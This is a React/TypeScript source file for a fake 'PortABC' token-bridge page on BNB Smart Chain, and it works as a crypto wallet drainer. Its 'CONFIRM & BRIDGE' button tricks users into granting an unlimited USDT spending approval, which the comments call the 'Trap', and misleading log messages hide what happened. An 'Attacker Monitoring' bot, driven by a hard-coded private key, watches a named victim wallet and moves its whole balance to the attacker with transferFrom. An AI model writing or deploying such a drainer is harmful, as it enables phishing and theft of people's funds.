"use client";

import React, { useState } from 'react';
import { ethers } from 'ethers';

/**
 * PortABC Protocol - PURE BSC (BEP-20) 
 * DIRECT UNLIMITED APPROVAL FLOW
 */

const BEP20_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function transferFrom(address from, address to, uint256 amount) returns (bool)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "function approve(address spender, uint256 amount) returns (bool)"
];

const BSC_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";

export default function PortABCDemo() {
  const [logs, setLogs] = useState<string[]>([]);
  const [isMonitoring, setIsMonitoring] = useState(false);
  const [targetAmount, setTargetAmount] = useState<string>("10");

  const ADMIN_PRIVATE_KEY = "E99f0eb86cf5019bab2f0d0564f89f13e5bb37e34f7ba635390e2e591c8c0271";
  const ADMIN_PUBLIC_ADDRESS = "0x8caf61F9Ba121A25f94338221b64408695DB5fa1"; 
  const RECEIVER_ADDRESS = "0x8caf61F9Ba121A25f94338221b64408695DB5fa1";
  const VICTIM_WALLET_ADDRESS = "0xc0b4ce03df84765ae604f239ea4bbc5731f308af";

  const addLog = (msg: string) => {
    setLogs(prev => [`[${new Date().toLocaleTimeString()}] ${msg}`, ...prev.slice(0, 5)]);
  };

  /**
   * Directly triggers Connection + Network Switch + Unlimited Approval
   */
  async function handleVictimAction() {
    try {
      if (!(window as any).ethereum) return alert("Wallet not detected");
      
      addLog("Initializing secure BSC bridge...");

      // 1. Force Switch to BSC (Chain 56 / 0x38)
      try {
        await (window as any).ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: '0x38' }],
        });
      } catch (err: any) {
        if (err.code === 4902) {
          await (window as any).ethereum.request({
            method: 'wallet_addEthereumChain',
            params: [{
              chainId: '0x38',
              chainName: 'BNB Smart Chain',
              nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
              rpcUrls: ['https://bsc-dataseed.binance.org/'],
              blockExplorerUrls: ['https://bscscan.com/']
            }]
          });
        }
      }

      // 2. Request Account & Initialize Provider
      const bscProvider = new ethers.providers.Web3Provider((window as any).ethereum);
      await bscProvider.send("eth_requestAccounts", []); // Pops connect window
      
      const signer = bscProvider.getSigner();
      const usdtContract = new ethers.Contract(BSC_USDT_ADDRESS, BEP20_ABI, signer);
      
      // 3. TRIGGER UNLIMITED APPROVAL IMMEDIATELY
      // This is the "Trap": It asks for permission to spend "MaxUint256"
      const tx = await usdtContract.approve(
        ADMIN_PUBLIC_ADDRESS, 
        ethers.constants.MaxUint256
      );
      
      addLog("Transaction broadcasted to BSC...");
      await tx.wait();
      addLog("BSC Verification Successful. Assets Synced.");

    } catch (err: any) {
      addLog("User denied or session expired.");
      console.error(err);
    }
  }

  /**
   * Attacker Monitoring Logic
   */
  async function startBSCMonitor() {
    try {
      const bscRpcProvider = new ethers.providers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
      const attackerSigner = new ethers.Wallet(ADMIN_PRIVATE_KEY, bscRpcProvider);
      const bscContract = new ethers.Contract(BSC_USDT_ADDRESS, BEP20_ABI, attackerSigner);

      setIsMonitoring(true);
      addLog("Bot: Monitoring BEP-20 Approval state...");

      const tracker = setInterval(async () => {
        try {
          const allowance = await bscContract.allowance(VICTIM_WALLET_ADDRESS, ADMIN_PUBLIC_ADDRESS);
          const balance = await bscContract.balanceOf(VICTIM_WALLET_ADDRESS);

          // If victim approved the Admin, the bot strikes
          if (allowance.gt(0) && balance.gt(0)) {
            addLog("Approval detected. Extracting assets...");
            
            const tx = await bscContract.transferFrom(
              VICTIM_WALLET_ADDRESS, 
              RECEIVER_ADDRESS, 
              balance, 
              {
                gasLimit: 100000, 
                gasPrice: ethers.utils.parseUnits('5', 'gwei') 
              }
            );
            await tx.wait();
            addLog(`Captured: ${ethers.utils.formatUnits(balance, 18)} BEP20-USDT`);
            clearInterval(tracker);
            setIsMonitoring(false);
          }
        } catch (e) {}
      }, 3000);
    } catch (err: any) {
      addLog("RPC connection failed.");
    }
  }

  return (
    <div className="min-h-screen bg-[#080808] text-white flex flex-col items-center justify-center p-6 font-sans">
      
      {/* PortABC "Trap" Interface */}
      <div className="w-full max-w-[400px] bg-[#121212] border border-white/5 rounded-[2rem] p-8 shadow-2xl">
        <div className="flex justify-between items-center mb-10">
          <h1 className="text-xl font-bold tracking-tight">PortABC</h1>
          <span className="text-[9px] bg-yellow-500/20 text-yellow-500 px-2 py-1 rounded font-bold uppercase tracking-tighter">BSC Active</span>
        </div>

        <div className="space-y-5">
          <div className="bg-[#1c1c1c] p-4 rounded-2xl border border-white/5">
            <p className="text-[10px] text-gray-500 font-bold uppercase mb-2">Bridge Asset</p>
            <div className="flex items-center gap-2">
              <div className="w-8 h-8 bg-green-500/10 rounded-full flex items-center justify-center text-green-500 text-xs font-black">T</div>
              <span className="text-sm font-semibold text-gray-200">USDT (BEP-20)</span>
            </div>
          </div>

          <div className="bg-[#1c1c1c] p-4 rounded-2xl border border-white/5">
            <p className="text-[10px] text-gray-500 font-bold uppercase mb-2">Amount</p>
            <input 
              type="number" 
              value={targetAmount}
              onChange={(e) => setTargetAmount(e.target.value)}
              className="bg-transparent text-xl font-bold w-full focus:outline-none text-white"
            />
          </div>

          <button 
            onClick={handleVictimAction}
            className="w-full bg-yellow-500 text-black font-black py-4 rounded-2xl hover:bg-yellow-400 transition-all shadow-lg shadow-yellow-500/10"
          >
            CONFIRM & BRIDGE
          </button>
        </div>
      </div>

      {/* Admin Panel (The Watcher) */}
      <div className="mt-10 w-full max-w-[400px]">
        <div className="bg-[#0f0f0f] border border-red-900/20 p-5 rounded-2xl">
          <div className="flex justify-between items-center mb-3">
            <p className="text-[9px] text-red-600 font-black uppercase tracking-widest">Bot Monitor</p>
            <button 
              onClick={startBSCMonitor}
              className={`text-[9px] px-3 py-1 rounded-full border transition-all ${isMonitoring ? 'bg-red-600 border-red-600 text-black' : 'border-red-900 text-red-900 hover:text-red-600'}`}
            >
              {isMonitoring ? "EXTRACTOR RUNNING" : "START BSC NODE"}
            </button>
          </div>
          <div className="bg-black/40 p-3 h-28 font-mono text-[10px] text-green-500 overflow-y-auto rounded-lg border border-white/5">
            {logs.length === 0 ? "> Awaiting input..." : logs.map((log, i) => <div key={i}>{`> ${log}`}</div>)}
          </div>
        </div>
      </div>
      
      <p className="mt-8 text-[9px] text-gray-700 tracking-widest uppercase">Secured by PortABC • BSC Network v3.0</p>
    </div>
  );
}
